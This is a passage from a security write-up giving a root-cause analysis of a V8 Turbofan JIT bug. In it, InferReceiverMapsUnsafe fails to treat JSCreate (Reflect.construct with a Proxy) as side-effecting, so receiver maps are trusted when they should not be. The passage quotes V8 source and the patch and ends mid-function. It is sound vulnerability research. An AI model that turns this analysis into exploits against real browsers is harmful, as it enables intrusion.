<h3 id="root-cause-analysis">Root-Cause Analysis<a href="#root-cause-analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Now that we have done a quick overview of the vulnerability and its implications from the regression test, let&rsquo;s take a deep dive into V8&rsquo;s source to identify the root-cause analysis for this vulnerability.</p>
<p>To start off, it is important to have in mind a high-level overview of Turbofan&rsquo;s JIT compilation pipeline shown in the following diagram :</p>
<p><img src="https://tmpout.sh/2/img/Pasted%20image%2020220112200715.png#center" alt="">&gt;</p>
<p>Within the distinct Turbofan&rsquo;s phases, we can highlight the inlining/specialization phase, in which lowering of builtin functions and reduction of specific nodes is performed, such as <code>JSCall</code> reduction and <code>JSCreate</code> lowering:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Performs strength reduction on {JSConstruct} and {JSCall} nodes,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// which might allow inlining or other optimizations to be performed afterwards.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">V8_EXPORT_PRIVATE</span> <span style="color:#a6e22e">JSCallReducer</span> <span style="color:#66d9ef">final</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">AdvancedReducer</span> {
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Flags that control the mode of operation.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">Flag</span> { <span style="color:#a6e22e">kNoFlags</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">u</span>, <span style="color:#a6e22e">kBailoutOnUninitialized</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">u</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">Flags</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">base</span><span style="color:#f92672">::</span><span style="color:#a6e22e">Flags</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Flag</span><span style="color:#f92672">&gt;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">JSCallReducer</span>(<span style="color:#a6e22e">Editor</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">editor</span>, <span style="color:#a6e22e">JSGraph</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">jsgraph</span>, <span style="color:#a6e22e">JSHeapBroker</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">broker</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">Zone</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">temp_zone</span>, <span style="color:#a6e22e">Flags</span> <span style="color:#a6e22e">flags</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">CompilationDependencies</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">dependencies</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">:</span> <span style="color:#a6e22e">AdvancedReducer</span>(<span style="color:#a6e22e">editor</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">jsgraph_</span>(<span style="color:#a6e22e">jsgraph</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">broker_</span>(<span style="color:#a6e22e">broker</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">temp_zone_</span>(<span style="color:#a6e22e">temp_zone</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">flags_</span>(<span style="color:#a6e22e">flags</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dependencies_</span>(<span style="color:#a6e22e">dependencies</span>) {}</span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Lowers JSCreate-level operators to fast (inline) allocations.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">V8_EXPORT_PRIVATE</span> <span style="color:#a6e22e">JSCreateLowering</span> <span style="color:#66d9ef">final</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">:</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">NON_EXPORTED_BASE</span>(<span style="color:#a6e22e">AdvancedReducer</span>) {
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">JSCreateLowering</span>(<span style="color:#a6e22e">Editor</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">editor</span>, <span style="color:#a6e22e">CompilationDependencies</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">dependencies</span>,
</span></span><span style="display:flex;"><span>                   <span style="color:#a6e22e">JSGraph</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">jsgraph</span>, <span style="color:#a6e22e">JSHeapBroker</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">broker</span>, <span style="color:#a6e22e">Zone</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">zone</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">:</span> <span style="color:#a6e22e">AdvancedReducer</span>(<span style="color:#a6e22e">editor</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dependencies_</span>(<span style="color:#a6e22e">dependencies</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">jsgraph_</span>(<span style="color:#a6e22e">jsgraph</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">broker_</span>(<span style="color:#a6e22e">broker</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">zone_</span>(<span style="color:#a6e22e">zone</span>) {}
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">~</span><span style="color:#a6e22e">JSCreateLowering</span>() <span style="color:#66d9ef">final</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">default</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">reducer_name</span>() <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">override</span> { <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;JSCreateLowering&#34;</span>; }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Reduction</span> <span style="color:#a6e22e">Reduce</span>(<span style="color:#a6e22e">Node</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">node</span>) <span style="color:#66d9ef">final</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">private</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Reduction</span> <span style="color:#a6e22e">ReduceJSCreate</span>(<span style="color:#a6e22e">Node</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">node</span>);</span></span></code></pre></div>
For our previous PoC&rsquo;s Inlining phase, reduction of <code>Array.prototype.pop</code> built-in function will be performed. The function in charge of doing so is<code>JSCallReducer::ReduceArrayPrototypePop(Node* node)</code> shown below:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// ES6 section 22.1.3.17 Array.prototype.pop ( )
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Reduction</span> <span style="color:#a6e22e">JSCallReducer</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ReduceArrayPrototypePop</span>(<span style="color:#a6e22e">Node</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">node</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DisallowHeapAccessIf</span> <span style="color:#a6e22e">disallow_heap_access</span>(<span style="color:#a6e22e">FLAG_concurrent_inlining</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DCHECK_EQ</span>(<span style="color:#a6e22e">IrOpcode</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kJSCall</span>, <span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">opcode</span>());
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CallParameters</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">CallParametersOf</span>(<span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">op</span>());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">speculation_mode</span>() <span style="color:#f92672">==</span> <span style="color:#a6e22e">SpeculationMode</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kDisallowSpeculation</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">NoChange</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Node</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">receiver</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">NodeProperties</span><span style="color:#f92672">::</span><span style="color:#a6e22e">GetValueInput</span>(<span style="color:#a6e22e">node</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Node</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">effect</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">NodeProperties</span><span style="color:#f92672">::</span><span style="color:#a6e22e">GetEffectInput</span>(<span style="color:#a6e22e">node</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Node</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">control</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">NodeProperties</span><span style="color:#f92672">::</span><span style="color:#a6e22e">GetControlInput</span>(<span style="color:#a6e22e">node</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">MapInference</span> <span style="color:#a6e22e">inference</span>(<span style="color:#a6e22e">broker</span>(), <span style="color:#a6e22e">receiver</span>, <span style="color:#a6e22e">effect</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">inference</span>.<span style="color:#a6e22e">HaveMaps</span>()) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">NoChange</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">MapHandles</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">receiver_maps</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">inference</span>.<span style="color:#a6e22e">GetMaps</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">ElementsKind</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">kinds</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">CanInlineArrayResizingBuiltin</span>(<span style="color:#a6e22e">broker</span>(), <span style="color:#a6e22e">receiver_maps</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">kinds</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">inference</span>.<span style="color:#a6e22e">NoChange</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">dependencies</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">DependOnNoElementsProtector</span>()) <span style="color:#a6e22e">UNREACHABLE</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">inference</span>.<span style="color:#a6e22e">RelyOnMapsPreferStability</span>(<span style="color:#a6e22e">dependencies</span>(), <span style="color:#a6e22e">jsgraph</span>(),
</span></span><span style="display:flex;"><span>                                      <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">effect</span>, <span style="color:#a6e22e">control</span>, <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">feedback</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Load the &#34;length&#34; property of the {receiver}.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Check if the {receiver} has any elements.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Load the elements backing store from the {receiver}.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Ensure that we aren&#39;t popping from a copy-on-write backing store.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Compute the new {length}.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Store the new {length} to the {receiver}.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Load the last entry from the {elements}.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Store a hole to the element we just removed from the {receiver}.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Convert the hole to undefined. Do this last, so that we can optimize
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// conversion operator via some smart strength reduction in many cases.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ReplaceWithValue</span>(<span style="color:#a6e22e">node</span>, <span style="color:#a6e22e">value</span>, <span style="color:#a6e22e">effect</span>, <span style="color:#a6e22e">control</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Replace</span>(<span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
This function will fetch the map of the <code>receiver</code> node by invoking <code>MapInference inference(broker(), receiver, effect)</code>  to then retrieve its elements kind as well as implement the logic for <code>Array.protype.pop</code>. Major operations performed by this function are summarized by the comments in the source code shown above for sake of simplicity.</p>
<p>We should also highlight the call to <code>inference.RelyOnMapsPreferStability</code>, which we will cover in a later stage. For now, let&rsquo;s focus on the call to <code>MapInference</code> constructor along with some of its instance methods. These are shown below :</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>MapInference<span style="color:#f92672">::</span><span style="color:#a6e22e">MapInference</span>(JSHeapBroker<span style="color:#f92672">*</span> broker, Node<span style="color:#f92672">*</span> object, Node<span style="color:#f92672">*</span> effect)
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">:</span> <span style="color:#a6e22e">broker_</span>(broker), <span style="color:#a6e22e">object_</span>(object) {
</span></span><span style="display:flex;"><span>  ZoneHandleSet<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> maps;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">auto</span> result <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      NodeProperties<span style="color:#f92672">::</span><span style="color:#a6e22e">InferReceiverMapsUnsafe</span>(broker_, object_, effect, <span style="color:#f92672">&amp;</span>maps);
</span></span><span style="display:flex;"><span>  maps_.<span style="color:#a6e22e">insert</span>(maps_.<span style="color:#a6e22e">end</span>(), maps.<span style="color:#a6e22e">begin</span>(), maps.<span style="color:#a6e22e">end</span>());
</span></span><span style="display:flex;"><span>  maps_state_ <span style="color:#f92672">=</span> (result <span style="color:#f92672">==</span> NodeProperties<span style="color:#f92672">::</span>kUnreliableReceiverMaps)
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">?</span> kUnreliableDontNeedGuard
</span></span><span style="display:flex;"><span>                    : kReliableOrGuarded;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DCHECK_EQ</span>(maps_.<span style="color:#a6e22e">empty</span>(), result <span style="color:#f92672">==</span> NodeProperties<span style="color:#f92672">::</span>kNoReceiverMaps);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MapInference<span style="color:#f92672">::~</span><span style="color:#a6e22e">MapInference</span>() { <span style="color:#a6e22e">CHECK</span>(<span style="color:#a6e22e">Safe</span>()); }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> MapInference<span style="color:#f92672">::</span><span style="color:#a6e22e">Safe</span>() <span style="color:#66d9ef">const</span> { <span style="color:#66d9ef">return</span> maps_state_ <span style="color:#f92672">!=</span> kUnreliableNeedGuard; }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> MapInference<span style="color:#f92672">::</span><span style="color:#a6e22e">SetNeedGuardIfUnreliable</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CHECK</span>(<span style="color:#a6e22e">HaveMaps</span>());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (maps_state_ <span style="color:#f92672">==</span> kUnreliableDontNeedGuard) {
</span></span><span style="display:flex;"><span>    maps_state_ <span style="color:#f92672">=</span> kUnreliableNeedGuard;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> MapInference<span style="color:#f92672">::</span><span style="color:#a6e22e">SetGuarded</span>() { maps_state_ <span style="color:#f92672">=</span> kReliableOrGuarded; }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> MapInference<span style="color:#f92672">::</span><span style="color:#a6e22e">HaveMaps</span>() <span style="color:#66d9ef">const</span> { <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>maps_.<span style="color:#a6e22e">empty</span>(); }</span></span></code></pre></div>
We can notice that at the beginning of the function, a call to <code>NodeProperties::InferReceiverMapsUnsafe</code> is performed. This function walks the effect chain in search for a node that can give hints into inferring the map of the receiver object. At the same time, this function is also in charge of marking the result as unreliable if it encounters a node without the <code>kNoWrite</code> flag, indicating that executing the node could have side-effects such as changing the map of an object.</p>
<p>This function returns an enum composed of three possible values which are the following:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">// Walks up the {effect} chain to find a witness that provides map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// information about the {receiver}. Can look through potentially
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// side effecting nodes.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">InferReceiverMapsResult</span> {
</span></span><span style="display:flex;"><span>    kNoReceiverMaps,         <span style="color:#75715e">// No receiver maps inferred.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    kReliableReceiverMaps,   <span style="color:#75715e">// Receiver maps can be trusted.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    kUnreliableReceiverMaps  <span style="color:#75715e">// Receiver maps might have changed (side-effect).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  };</span></span></code></pre></div>
A summerized overview of the implementation of <code>NodeProperties::InferReceiverMapsUnsafe</code> is shown below, highlighting the most important parts of this function:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// static
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">NodeProperties</span><span style="color:#f92672">::</span><span style="color:#a6e22e">InferReceiverMapsResult</span> <span style="color:#a6e22e">NodeProperties</span><span style="color:#f92672">::</span><span style="color:#a6e22e">InferReceiverMapsUnsafe</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JSHeapBroker</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">broker</span>, <span style="color:#a6e22e">Node</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">receiver</span>, <span style="color:#a6e22e">Node</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">effect</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ZoneHandleSet</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span><span style="color:#f92672">&gt;*</span> <span style="color:#a6e22e">maps_return</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">HeapObjectMatcher</span> <span style="color:#a6e22e">m</span>(<span style="color:#a6e22e">receiver</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">HasValue</span>()) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HeapObjectRef</span> <span style="color:#a6e22e">receiver</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">Ref</span>(<span style="color:#a6e22e">broker</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// We don&#39;t use ICs for the Array.prototype and the Object.prototype
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// because the runtime has to be able to intercept them properly, so
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// we better make sure that TurboFan doesn&#39;t outsmart the system here
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// by storing to elements of either prototype directly.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">receiver</span>.<span style="color:#a6e22e">IsJSObject</span>() <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">!</span><span style="color:#a6e22e">broker</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">IsArrayOrObjectPrototype</span>(<span style="color:#a6e22e">receiver</span>.<span style="color:#a6e22e">AsJSObject</span>())) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">receiver</span>.<span style="color:#a6e22e">map</span>().<span style="color:#a6e22e">is_stable</span>()) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// The {receiver_map} is only reliable when we install a stability
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// code dependency.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span><span style="color:#a6e22e">maps_return</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ZoneHandleSet</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span><span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">receiver</span>.<span style="color:#a6e22e">map</span>().<span style="color:#a6e22e">object</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">kUnreliableReceiverMaps</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InferReceiverMapsResult</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">kReliableReceiverMaps</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">effect</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">opcode</span>()) {
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">IrOpcode</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kJSCreate</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">IsSame</span>(<span style="color:#a6e22e">receiver</span>, <span style="color:#a6e22e">effect</span>)) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">base</span><span style="color:#f92672">::</span><span style="color:#a6e22e">Optional</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">MapRef</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">initial_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetJSCreateMap</span>(<span style="color:#a6e22e">broker</span>, <span style="color:#a6e22e">receiver</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">initial_map</span>.<span style="color:#a6e22e">has_value</span>()) {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span><span style="color:#a6e22e">maps_return</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ZoneHandleSet</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span><span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">initial_map</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object</span>());
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">// We reached the allocation of the {receiver}.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">kNoReceiverMaps</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">//result = kUnreliableReceiverMaps;  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#75715e">// ^ applied patch: JSCreate can have a side-effect.        
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>    ...</span></span></code></pre></div>
In this function, we can focus on the switch case nested in a while loop that transverses the effect chain. Each case in the switch case consists of specific nodes denoting Ignition opcodes relevant for map inference, in particular the opcode <code>IrOpcode::kJSCreate</code>.</p>
<p>This opcode will be generated for the invocation of <code>Reflect.construct</code>. Eventually, the while loop will run out of nodes to check and will fail to find an effect node with a map similar to the one of the receiver since the receiver map was changed via the <code>Proxy</code> function invocation in <code>Reflect.construct</code>. However, the function will still return a result of <code>kReliableReceiverMaps</code> despite having the receiver&rsquo;s map not being reliable.</p>
<p>We can see the patch applied to this function commented out, highlighting where the vulnerability resides. The invocation of <code>Reflect.construct</code> will in fact be able to change the maps of the receiver node, in this case the <code>JSArray</code> <code>a</code>. However, due to a logical error, <code>NodeProperties::InferReceiverMapsUnsafe</code> will fail to mark this node as <code>kUnreliableReceiverMaps</code>, as to denote that the receiver maps may have changed.</p>
<p>The implications of not marking this node as unreliable will become clear by the result of the invokation of <code>MapInference::RelyOnMapsPreferStability</code> by <code>JSCallReducer::ReduceArrayPrototypePop</code> shown below:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">MapInference</span><span style="color:#f92672">::</span><span style="color:#a6e22e">RelyOnMapsPreferStability</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CompilationDependencies</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">dependencies</span>, <span style="color:#a6e22e">JSGraph</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">jsgraph</span>, <span style="color:#a6e22e">Node</span><span style="color:#f92672">**</span> <span style="color:#a6e22e">effect</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Node</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">control</span>, <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FeedbackSource</span><span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">feedback</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CHECK</span>(<span style="color:#a6e22e">HaveMaps</span>());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Safe</span>()) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
